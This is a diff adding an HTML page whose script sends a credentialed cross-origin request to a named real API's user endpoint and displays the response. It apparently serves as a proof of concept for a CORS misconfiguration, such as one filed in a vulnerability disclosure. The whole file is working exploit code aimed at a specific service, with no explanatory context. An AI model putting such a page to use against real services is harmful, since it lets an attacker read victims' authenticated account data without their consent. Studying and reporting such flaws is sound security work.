@@ -1,0 +1,6 @@
+
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.lob.com/v1/users/',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
